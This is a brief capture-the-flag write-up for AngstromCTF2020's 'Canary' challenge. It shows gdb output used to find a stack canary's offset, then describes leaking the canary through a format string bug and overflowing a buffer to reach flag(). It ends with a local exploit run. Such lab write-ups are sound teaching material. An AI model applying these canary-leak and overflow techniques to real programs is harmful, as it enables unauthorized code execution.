# Canary

On examining the source code the chalenge becomes pretty clear, we'll have to leak the stack canary.
Luckilly we have a format string vulnerabilty to help with that.

Opening the binary up in gdb let's us know the offset of the canary from the top of the stack.

```gdb
Breakpoint 1, 0x00000000004008d6 in greet ()
gdb-peda$ tele 30
0000| 0x7fffffffde00 --> 0x7025 ('%p')
0008| 0x7fffffffde08 --> 0x7ffff7e4c003 (<_IO_new_file_overflow+275>:   cmp    eax,0xffffffff)
0016| 0x7fffffffde10 --> 0x19 
0024| 0x7fffffffde18 --> 0x7ffff7fa36a0 --> 0xfbad2887 
0032| 0x7fffffffde20 --> 0x400c17 ('^' <repeats 24 times>, "\n")
0040| 0x7fffffffde28 --> 0x7ffff7e3f60a (<__GI__IO_puts+378>:   cmp    eax,0xffffffff)
0048| 0x7fffffffde30 --> 0x0 
0056| 0x7fffffffde38 --> 0x7fffffffde60 --> 0x7fffffffde80 --> 0x4009d0 (<__libc_csu_init>:     push   r15)
0064| 0x7fffffffde40 --> 0x4006a0 (<_start>:    xor    ebp,ebp)
0072| 0x7fffffffde48 --> 0x7fffffffdf60 --> 0x1 
0080| 0x7fffffffde50 --> 0x0 
0088| 0x7fffffffde58 --> 0x641b92b866f8b100 
```
using the offset we leak the canary and from there proceed with a simple buffer overflow to redirect code execution to flag()..!

```bash
arch3r@1nv4d3r:~/git-repos/CTF-Writeups/AngstromCTF2020/Canary$ python exploit.py local NOPTRACE
[+] Starting local process './canary': pid 23886
[!] Skipping debug attach since context.noptrace==True
0xbbe4678322a48900
actf{fake_flag}


```
